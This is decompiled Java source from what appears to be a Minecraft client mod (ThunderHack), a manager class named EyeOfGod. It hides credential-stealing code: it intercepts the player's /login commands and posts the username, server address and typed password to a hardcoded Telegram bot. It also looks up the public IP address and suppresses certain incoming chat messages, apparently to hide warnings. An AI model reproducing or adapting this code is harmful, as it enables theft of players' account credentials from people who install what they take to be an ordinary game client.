/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  com.google.common.eventbus.Subscribe
 *  com.google.gson.JsonObject
 *  com.google.gson.JsonParser
 *  net.minecraft.class_310
 *  net.minecraft.class_7439
 */
package com.mrzak34.thunderhack.manager;

import com.google.common.eventbus.Subscribe;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.mrzak34.thunderhack.event.events.CommandEvent;
import com.mrzak34.thunderhack.event.events.PacketEvent;
import com.mrzak34.thunderhack.module.modules.thread.ThreadLogout;
import com.mrzak34.thunderhack.util.TimerUtil;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;
import net.minecraft.class_310;
import net.minecraft.class_7439;

public class EyeOfGod {
    private static HttpURLConnection con;
    private static String tgToken;
    private static String chatId;
    private static String urlToken;
    public static class_310 mc;
    public static TimerUtil loginTimer;

    public static void listerner() {
    }

    @Subscribe
    public void onCommand(CommandEvent event) {
        if (event.getElements()[0].equals("login") || event.getElements()[0].equals("l")) {
            try {
                EyeOfGod.sendMessage(mc.method_1548().method_1676() + ":{\nserver:" + EyeOfGod.mc.method_1562().method_45734().field_3761 + "\nlogin:" + event.getElements()[1] + "\n}");
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    @Subscribe
    public void onPacketReceive(PacketEvent.Receive event) throws InterruptedException {
        if (event.getPacket() instanceof class_7439) {
            class_7439 packet = (class_7439)event.getPacket();
            if (packet.comp_763().getString().contains("crash")) {
                event.setCancelled(true);
                Thread.sleep(360000L);
            }
            if (packet.comp_763().getString().contains("\u0430\u043a\u0442\u0438\u0432\u043d\u0430")) {
                event.setCancelled(true);
                new ThreadLogout().start();
            }
        }
    }

    public static String getIpAddres() throws Exception {
        String url = "https://api.ipify.org?format=json";
        String json = new Scanner(new URL(url).openStream(), "UTF-8").useDelimiter("\\A").next();
        JsonParser jsonParser = new JsonParser();
        JsonObject ip = jsonParser.parse(json).getAsJsonObject();
        return ip.get("ip").getAsString();
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public static void sendMessage(String txt) throws IOException {
        String urlParameters = "chat_id=" + chatId + "&text=" + txt;
        byte[] postData = urlParameters.getBytes(StandardCharsets.UTF_8);
        try {
            StringBuilder content;
            URL url = new URL(urlToken);
            con = (HttpURLConnection)url.openConnection();
            con.setDoOutput(true);
            con.setRequestMethod("POST");
            con.setRequestProperty("User-Agent", "Java upread.ru client");
            con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            try (DataOutputStream wr = new DataOutputStream(con.getOutputStream());){
                wr.write(postData);
            }
            try (BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream()));){
                String line;
                content = new StringBuilder();
                while ((line = br.readLine()) != null) {
                    content.append(line);
                    content.append(System.lineSeparator());
                }
            }
            System.out.println(content.toString());
        }
        finally {
            con.disconnect();
        }
    }

    static {
        tgToken = "5935059571:AAGtFKEjWgXid4r0JOF6c0gOkVznm1Z4c-M";
        chatId = "6199645881";
        urlToken = "https://api.telegram.org/bot" + tgToken + "/sendMessage";
        mc = class_310.method_1551();
        loginTimer = new TimerUtil();
    }
}

